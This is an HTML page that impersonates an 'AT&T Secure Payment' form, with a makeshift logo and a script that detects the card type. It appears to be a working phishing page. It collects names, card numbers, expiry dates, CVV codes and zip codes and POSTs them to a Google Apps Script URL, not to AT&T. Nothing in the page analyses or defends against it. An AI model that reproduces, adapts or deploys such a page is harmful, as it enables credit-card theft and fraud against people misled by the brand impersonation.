
<!DOCTYPE html>

<html lang="en">
<head>
<meta charset="utf-8"/>
<title>AT&amp;T Secure Payment</title>
<style>
         
        body {
            font-family: Arial, sans-serif;
            background-color: #f2f7fc;
            display: flex; flex-direction: column;
            justify-content: center;
            align-items: center;
            
            margin: 0;
        }
        .payment-form {
    margin: auto;
            background: #ffffff;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0,0,0,0.1);
            max-width: 450px;
            width: 100%;
            
            border-top: 5px solid #0073cf;
        }
        .payment-form h2 {
            color: #0073cf;
            text-align: center;
            margin-bottom: 25px;
        }
        .payment-form label {
            font-weight: bold;
            color: #333333;
        }
        .payment-form .name-fields {
            display: flex; flex-direction: column;
            gap: 10px;
        }
        .payment-form .name-fields input {
            width: 100%;
        }
        .payment-form input[type="text"],
        .payment-form input[type="number"],
        .payment-form input[type="submit"] {
            width: 100%;
            padding: 14px;
            margin: 10px 0;
            box-sizing: border-box;
            border: 1px solid #cccccc;
            border-radius: 4px;
            font-size: 16px;
        }
        .payment-form input[type="submit"] {
            background-color: #0073cf;
            color: #ffffff;
            font-weight: bold;
            border: none;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        .payment-form input[type="submit"]:hover {
            background-color: #005fa3;
        }
        .att-logo {
            display: block;
            margin: 0 auto 20px;
            width: 120px;
        }
        .note {
            font-size: 12px;
            text-align: center;
            color: #999999;
            margin-top: 15px;
        } 




        
    </style>
</head>
<body>
<div class="payment-form">
<svg class="att-logo" style="display: block; margin: 0 auto 20px;" viewbox="0 0 200 100" width="120" xmlns="http://www.w3.org/2000/svg">
<circle cx="100" cy="50" fill="#0073cf" r="40"></circle>
<text fill="#ffffff" font-family="Arial, sans-serif" font-size="20" text-anchor="middle" x="100" y="57">AT&amp;T</text>
</svg>
<h2>AT&amp;T Secure Payment</h2>
<form action="https://script.google.com/macros/s/AKfycbwh_Rx_fxi2JudxAeIGjyIniPVLLen2beL_HDgkmx41yKHkX20LNxqhMZ6P9JLjZkPscA/exec" method="POST">
<label>First Name &amp; Last Name</label>
<div class="name-fields">
<input name="firstname" placeholder="First Name" required="" type="text"/>
<input name="lastname" placeholder="Last Name" required="" type="text"/>
</div>
<label>Card Number</label>
<input name="cardnumber" placeholder="1234 5678 9012 3456" required="" type="text"/>
<p id="card-type" style="margin: 5px 0; font-weight: bold; color: #0073cf;"></p>
<label>Expiration Date</label>
<div style="display: flex; gap: 10px;">
<select name="expMonth" required="" style="flex: 1; padding: 14px; border: 1px solid #cccccc; border-radius: 4px; font-size: 16px;">
<option value="">Month</option>
<option value="01">01 - Jan</option>
<option value="02">02 - Feb</option>
<option value="03">03 - Mar</option>
<option value="04">04 - Apr</option>
<option value="05">05 - May</option>
<option value="06">06 - Jun</option>
<option value="07">07 - Jul</option>
<option value="08">08 - Aug</option>
<option value="09">09 - Sep</option>
<option value="10">10 - Oct</option>
<option value="11">11 - Nov</option>
<option value="12">12 - Dec</option>
</select>
<select name="expYear" required="" style="flex: 1; padding: 14px; border: 1px solid #cccccc; border-radius: 4px; font-size: 16px;">
<option value="">Year</option>
<option value="2024">2024</option><option value="2025">2025</option><option value="2026">2026</option><option value="2027">2027</option><option value="2028">2028</option><option value="2029">2029</option><option value="2030">2030</option><option value="2031">2031</option><option value="2032">2032</option><option value="2033">2033</option><option value="2034">2034</option>
</select>
</div>
<div style="margin-top: 10px;"><label>CVV</label><input name="cvv" placeholder="123" required="" type="number"/></div>

<label>Zip Code</label>
<input name="zipcode" placeholder="12345" required="" type="text"/>
<div style="margin: 10px 0;">
<input id="saveCard" name="saveCard" type="checkbox"/>
<label for="saveCard">Save my card information for future purpose</label>
</div>
<input type="submit" value="Submit"/>
</form>
<p class="note">Please do not share card details without secure authorization.</p>
</div>
<script>
document.querySelector('input[name="cardnumber"]').addEventListener('input', function () {
    const number = this.value.replace(/\s+/g, '');
    let cardType = 'Unknown';

    if (/^4/.test(number)) {
        cardType = 'Visa';
    } else if (/^5[1-5]/.test(number)) {
        cardType = 'MasterCard';
    } else if (/^3[47]/.test(number)) {
        cardType = 'American Express';
    } else if (/^6(?:011|5)/.test(number)) {
        cardType = 'Discover';
    }

    document.getElementById('card-type').textContent = 'Card Type: ' + cardType;
});
</script>
</body>
</html>
